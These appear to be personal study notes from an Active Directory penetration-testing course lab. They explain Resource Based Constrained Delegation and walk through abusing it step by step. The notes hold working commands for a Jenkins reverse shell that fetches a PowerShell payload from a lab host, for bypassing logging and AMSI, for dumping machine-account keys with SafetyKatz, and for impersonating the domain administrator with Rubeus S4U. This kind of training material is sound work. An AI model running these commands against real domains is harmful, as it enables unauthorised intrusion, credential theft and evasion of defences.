- RBCD (Resource Based Constrained Delegation) moves the delegation authority from the Domain Admin and passes it on to the resource owner/service administrator.
- Instead of `msDS-AllowedToDelegateTo` on the first hop, access to the second hop is now controlled by a security descriptor, `msDS-AllowedToActOnBehalfOfOtherIdentity` (visible as `PrincipalsAllowedToDelegateToAccount`) on the resource/service (the second hop).
	- This basically stores the list of identities that can access the resource on the target service (second hop) itself.
- This means that the resource/service administrator can configure this delegation, whereas for other types, `SeEnableDelegation` privileges are required which are, by default, only available to Domain Admins.
- The impact of abuse remains the same, if we can abuse RBCD, we can access any service on the second hop as any user in the domain.

#### Abusing RBCD  - Prerequisites
- In an attack scenario, during an assessment, we will not only find ourselves abusing RBCD, but also configuring it before we abuse it.
- This is because RBCD is not as widely implemented as it should.
- To configure and abuse RBCD, we need two things:
	- Write permissions over the target service or object to configure `msDS-AllowedToActOnBehalfOfOtherIdentity` (i.e. GenericWrite or GenericAll on the target service).
		- This makes us the "resource owner" or "administrator" or the target service.
	- What would we configure RBCD for on the target resource (second hop)? (What identity will we allow access to the second hop for?)
		- An object that we have control over (admin access over a domain joined machine, or a machine for which we have the ability to join to the domain (By default, each user can join 10 machines to the domain. (`msDS-MachineAccountQuota` is 10 for all domain users.))
			- If we join a computer object to the domain, we own the computer object and have the ability to reset its password and use it.

#### Abusing RBCD
- We already have admin privileges on the student VM.
- What we would be interested in is to check if we have access as an entity  that has GenericWrite on a machine, enabling us to configure RBCD on it.
	- Enumeration would show that the user `ciadmin` that we have compromised, has GenericWrite over `dcorp-mgmt`.
		- `Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'ciadmin'}
		- Enumerate using BloodHound as well.
- We will configure RBCD on `dcorp-mgmt` to allow access for the studentX user, using PowerView or the AD module:
	- Using AD module:
		- ```$comps = 'dcorp-student1$'
		  Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps```
			- Since we didn't specify a specific service, this command configures RBCD machine-wide.
			- In this case `dcorp-student1$` would be the first hop, and `dcorp-mgmt` would be the second hop.
			- The delegation authority sits with the resource administrator, which here is `ciadmin`.
	- Using PowerView:
		- `Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student1$' -Verbose`
		- `Get-DomainRBCD`
	- Next, we will use mimikatz or SafetyKatz to extract the credentials for `dcorp-student1$`, always use the key associated with the SYSTEM SID (S-1-5-18).
		- When accessing any resource on the domain, the SYSTEM SID (S-1-5-18) represents the machine account.
		- If we have joined a machine to the domain instead, we can just reset the credentials for it to have access via it.
- Performing the attack, using the AES key of the `dcorp-studentX$` user with Rubeus' S4U module, to access `dcorp-mgmt` as any user we want:
	- `Rubeus.exe s4u /user:dcorp-studentX$ /aes256:<AES256 hash of the studentX$ account> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt`
	- Accessing `dcorp-mgmt`:
		- `winrs -r:dcorp-mgmt cmd.exe`

#### Learning Objective 17
- Find a computer object in dcorp domain where we have GenericWrite permissions.
	- Check the steps mentioned above.
- Abuse the GenericWrite permissions to access that computer as a Domain Admin.
	- First, check the steps mentioned above in "Abusing RBCD", and then refer back here for additional context.
	- Abusing Jenkins to gain access as `ciadmin` (A quick review, for more details refer to Service Abuse - Jenkins, in previous parts of the notes):
		- On the student VM, start a netcat listener:
			- `C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443`
		- Navigate to the Jenkins instance using a web browser, and log in using the default credentials.
		- Go to any project, and then go to configure, add a "Execute Windows batch command" build step with a command connecting to the netcat listener we set up, and build the project.
			- `powershell.exe iex (iwr http://172.16.100.1/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.1 -Port 443`
				- Also, start HFS for the reverse shell command to fetch the script used for Windows reverse shell.
		- Now that we have the reverse shell, bypass script block logging and AMSI using the given scripts for them.
			- `iex (iwr http://172.16.100.1/sbloggingbypass.txt -UseBasicParsing)`
			- `S'eT-It'em..............`
		- Download and execute PowerView in memory to configure RBCD, fetching from the HFS server.
			- `iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.1/PowerView.ps1')`
			- `Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student1$' -Verbose`
			- `Get-DomainRBCD`
		- Close the reverse shell.
		- Extracting the credentials for the student1$ account:
			- `C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`
				- Always use the keys that are associated with the SYSTEM SID (S-1-5-18).
				- When accessing any resource on the domain, the SYSTEM SID (S-1-5-18) represents the machine account.
		- and perform a RBCD attack using Rubeus' S4U module:
			- `C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-student1$ /aes256:<AES key of the student1 machine account> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt`
			- `klist`
			- `winrs -r:dcorp-mgmt cmd`